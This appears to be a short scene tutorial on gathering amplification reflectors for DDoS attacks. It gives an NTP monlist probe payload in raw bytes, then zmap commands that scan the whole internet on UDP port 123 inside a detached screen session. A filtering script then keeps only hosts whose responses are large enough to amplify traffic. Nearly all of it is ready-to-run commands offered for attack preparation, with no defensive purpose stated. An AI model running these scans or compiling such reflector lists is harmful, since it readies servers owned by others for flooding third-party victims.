## AMP Scanning Tutorial(ubuntu)

# Scanning

# Making a probe
echo -ne '[PAYLOAD]' >> [OUTPUT].pkt

# Example
echo -ne '\x17\x00\x03\x2a\x00\x00\x00\x00' >> ntp.pkt

# Installing
apt-get -y update && apt-get -y upgrade && apt-get -y install zmap && apt-get -y install python && apt-get -y install screen

# Scanning
zmap -p [PORT] -M udp --probe-args=file:[PROBE].pkt -o [OUTPUT].txt

# Example
zmap -p 123 -M udp --probe-args=file:/root/ntp.pkt -o ntp.txt

# Screen
screen -dmS ntp zmap -p 123 -M udp --probe-args=file:/root/ntp.pkt -o ntp.txt

# Filtering (just use EasyFilter 1.0 by Alemalakra)
python filter.py <INPUT> <OUTPUT> <PROTOCOL> <MIN BYTES> <OUTPUT SYNTAX>

# Example
python filter.py ntp.txt ntp_filtered.txt ntp 8 [ip][space][bytes]

# Change the min bytes according to the amp
